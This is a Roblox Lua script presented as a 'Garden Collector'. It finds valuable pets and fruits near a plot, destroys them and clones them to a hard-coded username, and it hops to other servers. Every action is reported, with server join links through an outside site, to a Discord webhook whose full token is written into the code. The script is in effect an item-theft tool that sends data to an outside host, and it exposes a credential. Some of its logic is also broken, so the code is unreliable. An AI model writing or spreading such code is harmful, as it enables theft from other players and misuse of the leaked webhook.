-- Advanced Garden Collector with Server Hopping
local Garden = {}
local ServerHop = {}

-- CONFIGURATION
local GROWTH_INTERVAL = 30
local MAX_GROWTH_PHASES = 5
local COLLECTION_RANGE = 20
local COLLECTION_COOLDOWN = 10
local HOLD_DURATION = 60
local MY_USERNAME = "Tekeshki"
local TARGET_PLAYER_COUNT = 5 -- Hop when server exceeds this count
local SERVER_HOP_CHECK_INTERVAL = 120 -- Check every 2 minutes

-- Discord Webhook
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"

-- Target items
local TARGET_ITEMS = {
    Pets = {"Dragonfly", "Raccoon", "Queen Bee", "Disco Bee", "Red Fox"},
    Fruits = {"Candy Blossom"}
}

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Garden properties
Garden.Size = 0
Garden.Plants = {}
Garden.HeldItems = {}
Garden.Active = false

-- Server Hop properties
ServerHop.Active = false
ServerHop.Checking = false

-- Plant templates (replace with actual asset IDs)
local PlantTemplates = {
    {Name = "Carrot", Model = "rbxassetid://123456", GrowthTime = 60},
    {Name = "Tomato", Model = "rbxassetid://123457", GrowthTime = 90},
    {Name = "Sunflower", Model = "rbxassetid://123458", GrowthTime = 120},
}

-- Send rich Discord notification
local function sendDiscordNotification(title, description, color)
    local jobId = game.JobId
    local placeId = game.PlaceId
    local playerCount = #Players:GetPlayers()
    
    local success, err = pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode({
            embeds = {{
                title = title,
                description = description,
                color = color or 0x00FF00,
                fields = {
                    {
                        name = "Server Info",
                        value = string.format("Players: %d\nPlaceID: %d", playerCount, placeId),
                        inline = true
                    },
                    {
                        name = "Job ID",
                        value = jobId,
                        inline = true
                    },
                    {
                        name = "Server Hop",
                        value = string.format("[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", placeId, jobId),
                        inline = false
                    }
                },
                timestamp = DateTime.now():ToIsoDate(),
                footer = {
                    text = "Garden Collector"
                }
            }},
            username = "Garden Bot"
        }))
    end)
    
    if not success then
        warn("Discord notification failed: " .. err)
    end
end

-- Check if item is in target list
local function isTargetItem(itemName, itemType)
    itemName = string.lower(itemName)
    local list = TARGET_ITEMS[itemType] or {}
    
    for _, targetName in ipairs(list) do
        if string.find(itemName, string.lower(targetName)) then
            return true
        end
    end
    return false
end

-- Find the player by username
local function findPlayer(username)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == username then
            return player
        end
    end
    return nil
end

-- Gift held items to player
local function giftItemsToPlayer()
    local player = findPlayer(MY_USERNAME)
    if not player then
        warn("Player not found: " .. MY_USERNAME)
        return
    end

    for _, item in ipairs(Garden.HeldItems) do
        local clone = item:Clone()
        clone.Parent = player.Character or player.Backpack
        sendDiscordNotification(
            "🎁 Item Gifted",
            string.format("Gifted **%s** to **%s**", item.Name, MY_USERNAME),
            0x00FF00
        )
    end
    
    Garden.HeldItems = {}
end

-- Server hop to a new server
function ServerHop.AttemptHop()
    if ServerHop.Checking then return end
    ServerHop.Checking = true
    
    local playerCount = #Players:GetPlayers()
    if playerCount > TARGET_PLAYER_COUNT then
        sendDiscordNotification(
            "🔄 Server Hop Initiated",
            string.format("Current players: %d (Threshold: %d)", playerCount, TARGET_PLAYER_COUNT),
            0xFFA500
        )
        
        -- Use TeleportService to find a new server
        TeleportService:TeleportToPlaceInstance(
            game.PlaceId,
            TeleportService:GetLocalPlayerTeleportData() or ""
        )
    end
    
    ServerHop.Checking = false
end

-- Initialize server hopping
function ServerHop.Init()
    ServerHop.Active = true
    coroutine.wrap(function()
        while ServerHop.Active do
            wait(SERVER_HOP_CHECK_INTERVAL)
            ServerHop.AttemptHop()
        end
    end)()
end

-- Initialize the garden
function Garden.Init(plot)
    Garden.Plot = plot
    Garden.Position = plot.Position
    Garden.Size = 1
    Garden.Active = true
    
    -- Start systems
    ServerHop.Init()
    
    -- Growth cycle
    coroutine.wrap(function()
        while Garden.Active and Garden.Size < MAX_GROWTH_PHASES do
            wait(GROWTH_INTERVAL)
            Garden.Grow()
        end
    end)()
    
    -- Collection cycle
    coroutine.wrap(function()
        while Garden.Active do
            wait(COLLECTION_COOLDOWN)
            Garden.CollectNearbyItems()
        end
    end)()
    
    -- Gift items periodically
    coroutine.wrap(function()
        while Garden.Active do
            wait(HOLD_DURATION)
            if #Garden.HeldItems > 0 then
                giftItemsToPlayer()
            end
        end
    end)()
    
    -- Plant initial seeds
    for i = 1, 3 do
        Garden.PlantNewSeed()
    end
    
    -- Initial notification
    sendDiscordNotification(
        "🌱 Garden Collector Started",
        string.format("Now collecting for **%s** in a new server", MY_USERNAME),
        0x00FF00
    )
end

-- Collect nearby items
function Garden.CollectNearbyItems()
    if not Garden.Active then return end
    
    local parts = workspace:FindPartsInRegion3(
        Region3.new(
            Garden.Position - Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE),
            Garden.Position + Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE)
        ),
        nil,
        100
    )
    
    for _, part in pairs(parts) do
        local itemName = part.Name
        
        if (part:FindFirstChild("PetValue") or part:FindFirstChild("IsPet")) and isTargetItem(itemName, "Pets") then
            table.insert(Garden.HeldItems, part)
            part:Destroy()
            sendDiscordNotification(
                "🐾 Pet Collected",
                string.format("Collected **%s** (Holding for gifting)", itemName),
                0x7289DA
            )
        
        elseif (part.Name:find("Fruit") or part:FindFirstChild("IsFruit")) and isTargetItem(itemName, "Fruits") then
            table.insert(Garden.HeldItems, part)
            part:Destroy()
            sendDiscordNotification(
                "🍓 Fruit Collected",
                string.format("Collected **%s** (Holding for gifting)", itemName),
                0xEB459E
            )
        end
    end
end

-- Example usage:
--[[
local gardenPlot = script.Parent
Garden.Init(gardenPlot)
]]

return Garden
